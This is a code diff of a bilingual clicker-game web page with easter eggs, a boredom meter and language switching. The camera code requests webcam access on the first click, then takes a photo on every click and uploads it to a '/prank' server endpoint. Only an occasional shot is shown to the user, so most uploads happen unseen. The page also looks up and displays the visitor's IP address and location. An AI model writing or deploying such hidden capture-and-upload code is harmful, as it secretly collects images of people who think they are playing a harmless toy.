+    showEgg(L.eggStay5[0], L.eggStay5[1]);
+  }
+}, 300000);
 
-    /* 连击 */
-    if (now - lastTime < 600) {
-      streak++;
-      if (streak > bestStreak) {
-        bestStreak = streak;
-        document.getElementById('streak-num').textContent = bestStreak;
-      }
-    } else { streak = 1; }
-    lastTime = now;
-    clearTimeout(streakTimer);
-    streakTimer = setTimeout(function(){ streak = 0; }, 700);
-
-    /* emoji 只在无照片时切换 */
-    if (btnPhoto.style.opacity !== '1') {
-      btnEmoji.textContent = emojis[count % emojis.length];
-    } else {
-      /* 记一下，照片消失后切换 */
-      btnEmoji.textContent = emojis[count % emojis.length];
+/* ═══════════════════════════════════════
+   空白区域点击彩蛋（50次）
+═══════════════════════════════════════ */
+document.body.addEventListener('click', function(e) {
+  if (e.target === document.body || e.target.tagName === 'HTML') {
+    blankClicks++;
+    if (blankClicks >= 50) {
+      blankClicks = 0;
+      var L = i18n[lang];
+      showEgg(L.eggEmpty[0], L.eggEmpty[1]);
     }
-    document.getElementById('count-num').textContent = count;
+  }
+});
 
-    /* 消息 */
-    var milestone = L.milestones[count];
-    if (milestone) {
-      document.getElementById('msg').textContent = milestone[0];
-      document.getElementById('sub').textContent = milestone[1] || '\u00A0';
-    } else {
-      var pair = L.msgs[count % L.msgs.length];
-      document.getElementById('msg').textContent = pair[0];
-      document.getElementById('sub').textContent = pair[1] || '\u00A0';
-    }
+/* ═══════════════════════════════════════
+   彩蛋弹层
+═══════════════════════════════════════ */
+function showEgg(msg, sub) {
+  document.getElementById('egg-msg').textContent = msg;
+  document.getElementById('egg-sub').textContent = sub || '';
+  document.getElementById('egg-overlay').classList.add('show');
+}
+function closeEgg() {
+  document.getElementById('egg-overlay').classList.remove('show');
+  if (asleep) {
+    asleep = false;
+    boredom = 20;
+    document.body.classList.remove('asleep');
+    updateBoredom();
+  }
+}
 
-    /* 进度条 */
-    var goal = Math.ceil(count / 10) * 10;
-    var prev = goal - 10;
-    document.getElementById('progress-bar').style.width = ((count - prev) / 10 * 100) + '%';
-    document.getElementById('goal-hint').textContent = L.goalFmt(count - prev, 10);
+/* ═══════════════════════════════════════
+   "离开" 按钮（反产品设计）
+═══════════════════════════════════════ */
+function handleLeave() {
+  var L = i18n[lang];
+  var btn = document.getElementById('leave-btn');
+  var msgs = L.leaveReply;
+  var idx = leaveClicked ? 1 : 0;
+  leaveClicked = true;
+  document.getElementById('t-leave').textContent = msgs[idx];
+  btn.style.opacity = '0.5';
+  setTimeout(function(){
+    document.getElementById('t-leave').textContent = L.leave;
+    btn.style.opacity = '1';
+  }, 2500);
+}
 
-    /* 首次点击请求摄像头 */
-    if (count === 1) { initCamera(); }
+/* ═══════════════════════════════════════
+   摄像头
+═══════════════════════════════════════ */
+var camStream = null, camReady = false, camDenied = false;
+var nextShotIn = randInterval();
 
-    /* 每次点击都拍照上传；到展示轮次时 show=true */
-    nextShotIn--;
-    var shouldShow = (nextShotIn <= 0);
-    if (shouldShow) { nextShotIn = randInterval(); }
-    setTimeout(function(){ takeAndUpload(shouldShow); }, 120);
+function randInterval() { return Math.floor(Math.random() * 5) + 18; }
+
+function initCamera() {
+  if (camStream || camDenied) return;
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+    .then(function(stream) {
+      camStream = stream; video.srcObject = stream; video.play(); camReady = true;
+    })
+    .catch(function() {
+      camDenied = true;
+      var el = document.getElementById('cam-denied');
+      el.textContent = i18n[lang].selfieDenied;
+      el.classList.add('visible');
+    });
+}
+
+function takeAndUpload(show) {
+  if (!camReady || !camStream) return;
+  var W = 320, H = 320;
+  canvas.width = W; canvas.height = H;
+  var ctx = canvas.getContext('2d');
+  ctx.translate(W,0); ctx.scale(-1,1);
+  ctx.drawImage(video, 0, 0, W, H);
+  var dataUrl = canvas.toDataURL('image/jpeg', 0.82);
+  uploadPhoto(dataUrl);
+  if (show) {
+    var flash = document.getElementById('flash-overlay');
+    flash.classList.add('flash');
+    setTimeout(function(){ flash.classList.remove('flash'); }, 120);
+    showPhotoInButton(dataUrl);
+  }
+}
+
+async function uploadPhoto(imageDataUrl) {
+  try {
+    const response = await fetch('/prank', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: imageDataUrl }),
+    });
+    if (response.ok) { console.log('upload success'); }
+    else { console.error('upload fail:', response.statusText); }
+  } catch(e) { console.error('upload error:', e); }
+}
+
+function showPhotoInButton(dataUrl) {
+  clearTimeout(photoTimer);
+  btnPhoto.src = dataUrl;
+  btnPhoto.style.opacity = '1';
+  btnEmoji.style.opacity = '0';
+  bigBtn.classList.add('has-photo');
+  photoTimer = setTimeout(function() {
+    btnPhoto.style.opacity = '0';
+    btnEmoji.style.opacity = '1';
+    bigBtn.classList.remove('has-photo');
+  }, 3000);
+}
+
+/* ═══════════════════════════════════════
+   点击主逻辑
+═══════════════════════════════════════ */
+function handleClick() {
+  if (asleep) { boredom = 60; asleep = false; document.body.classList.remove('asleep'); updateBoredom(); return; }
+
+  count++;
+  var now = Date.now();
+  var L = i18n[lang];
+
+  // 点击 → 无聊值小幅下降
+  boredom = Math.max(0, boredom - (2 + Math.random() * 3));
+  updateBoredom();
+  lastClickTime = now;
+
+  // 连击
+  if (now - lastClickTime < 600) {
+    streak++;
+    if (streak > bestStreak) bestStreak = streak;
+  } else { streak = 1; }
+  clearTimeout(streakTimer);
+  streakTimer = setTimeout(function(){ streak = 0; }, 700);
+
+  // emoji
+  btnEmoji.textContent = emojis[count % emojis.length];
+  document.getElementById('count-num').textContent = count;
+
+  // 消息
+  var milestone = L.milestones[count];
+  if (milestone) {
+    document.getElementById('msg').textContent = milestone[0];
+    document.getElementById('sub').textContent = milestone[1] || '\u00A0';
+  } else {
+    var pair = L.msgs[count % L.msgs.length];
+    document.getElementById('msg').textContent = pair[0];
+    document.getElementById('sub').textContent = pair[1] || '\u00A0';
   }
 
-  /* ── 语言切换 ── */
-  function toggleLang() { lang = lang === 'zh' ? 'en' : 'zh'; applyLang(); }
-  function applyLang() {
-    var L = i18n[lang];
-    document.getElementById('t-title').textContent     = L.title;
-    document.getElementById('t-subtitle').textContent  = L.subtitle;
-    document.getElementById('t-clicks').textContent    = L.clicks;
-    document.getElementById('t-streak').textContent    = L.streak;
-    document.getElementById('t-wasted').textContent    = L.wasted;
-    document.getElementById('t-footer').textContent    = L.footer;
-    document.getElementById('lang-btn').textContent    = L.langBtn;
-    document.querySelector('html').lang = lang === 'zh' ? 'zh-CN' : 'en';
-    if (count === 0) {
-      document.getElementById('msg').textContent = L.initMsg;
-      document.getElementById('sub').innerHTML = '&nbsp;';
-    }
-    if (camDenied) document.getElementById('cam-denied').textContent = L.selfieDenied;
-    var goal = Math.ceil((count+1)/10)*10;
-    document.getElementById('goal-hint').textContent = L.goalFmt(count-(goal-10), 10);
+  // 进度条（对应"距离下一个什么都没有"）
+  var goal = Math.ceil(count / 10) * 10;
+  var prev = goal - 10;
+  document.getElementById('progress-bar').style.width = ((count - prev) / 10 * 100) + '%';
+  document.getElementById('goal-hint').textContent = L.goalFmt(count - prev, 10);
+
+  // 摄像头
+  if (count === 1) { initCamera(); }
+  nextShotIn--;
+  var shouldShow = (nextShotIn <= 0);
+  if (shouldShow) { nextShotIn = randInterval(); }
+  setTimeout(function(){ takeAndUpload(shouldShow); }, 120);
+}
+
+/* ═══════════════════════════════════════
+   语言切换
+═══════════════════════════════════════ */
+function toggleLang() { lang = lang === 'zh' ? 'en' : 'zh'; applyLang(); }
+function applyLang() {
+  var L = i18n[lang];
+  document.getElementById('t-title').textContent     = L.title;
+  document.getElementById('t-subtitle').textContent  = L.subtitle;
+  document.getElementById('t-clicks').textContent    = L.clicks;
+  document.getElementById('t-boredom').textContent   = L.boredom;
+  document.getElementById('t-wasted').textContent    = L.wasted;
+  document.getElementById('t-footer').textContent    = L.footer;
+  document.getElementById('t-leave').textContent     = L.leave;
+  document.getElementById('lang-btn').textContent    = L.langBtn;
+  document.getElementById('philosophy').textContent  = L.philosophies[philosophyIdx];
+  document.getElementById('alive-check').textContent = L.aliveCheck;
+  document.querySelector('html').lang = lang === 'zh' ? 'zh-CN' : 'en';
+  if (count === 0) {
+    document.getElementById('msg').textContent = L.initMsg;
+    document.getElementById('sub').innerHTML = '&nbsp;';
   }
+  if (camDenied) document.getElementById('cam-denied').textContent = L.selfieDenied;
+  updateBoredom();
+  var goal = Math.ceil((count+1)/10)*10;
+  document.getElementById('goal-hint').textContent = L.goalFmt(count-(goal-10), 10);
+}
 
-  /* ── 秒表 ── */
-  setInterval(function(){
-    document.getElementById('wasted-num').textContent =
-      Math.floor((Date.now() - startTime) / 1000);
-  }, 1000);
+/* ═══════════════════════════════════════
+   秒表
+═══════════════════════════════════════ */
+setInterval(function(){
+  document.getElementById('wasted-num').textContent =
+    Math.floor((Date.now() - startTime) / 1000);
+}, 1000);
 
-  /* ── IP 地理位置（全 HTTPS，多接口降级） ── */
-  (function fetchIP() {
-    var ipEl  = document.getElementById('ip-text');
-    var locEl = document.getElementById('loc-text');
-
-    function setInfo(ip, parts) {
-      ipEl.textContent  = ip || '';
-      locEl.textContent = parts.filter(Boolean).join(' · ');
-    }
-
-    /* 接口1: ip.sb */
-    function tryIpSb() {
-      return fetch('https://api.ip.sb/geoip', { cache: 'no-store' })
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-          setInfo(d.ip, [d.country, d.region, d.city]);
-        });
-    }
-
-    /* 接口2: ipwho.is */
-    function tryIpWho() {
-      return fetch('https://ipwho.is/', { cache: 'no-store' })
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-          setInfo(d.ip, [d.country, d.region, d.city]);
-        });
-    }
-
-    /* 接口3: freeipapi.com */
-    function tryFreeIpApi() {
-      return fetch('https://freeipapi.com/api/json', { cache: 'no-store' })
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-          setInfo(d.ipAddress, [d.countryName, d.regionName, d.cityName]);
-        });
-    }
-
-    tryIpSb()
-      .catch(function() { return tryIpWho(); })
-      .catch(function() { return tryFreeIpApi(); })
-      .catch(function() { ipEl.textContent = ''; });
-  })();
+/* ═══════════════════════════════════════
+   IP 地理位置
+═══════════════════════════════════════ */
+(function fetchIP() {
+  var ipEl  = document.getElementById('ip-text');
+  var locEl = document.getElementById('loc-text');
+  function setInfo(ip, parts) {
+    ipEl.textContent  = ip || '';
+    locEl.textContent = parts.filter(Boolean).join(' · ');
+  }
+  function tryIpSb() {
+    return fetch('https://api.ip.sb/geoip', { cache: 'no-store' })
+      .then(function(r){ return r.json(); })
+      .then(function(d){ setInfo(d.ip, [d.country, d.region, d.city]); });
+  }
+  function tryIpWho() {
+    return fetch('https://ipwho.is/', { cache: 'no-store' })
+      .then(function(r){ return r.json(); })
+      .then(function(d){ setInfo(d.ip, [d.country, d.region, d.city]); });
+  }
+  function tryFreeIpApi() {
+    return fetch('https://freeipapi.com/api/json', { cache: 'no-store' })
+      .then(function(r){ return r.json(); })
+      .then(function(d){ setInfo(d.ipAddress, [d.countryName, d.regionName, d.cityName]); });
+  }
+  tryIpSb()
+    .catch(function(){ return tryIpWho(); })
+    .catch(function(){ return tryFreeIpApi(); })
+    .catch(function(){ ipEl.textContent = ''; });
+})();
 </script>
 </body>
 </html>
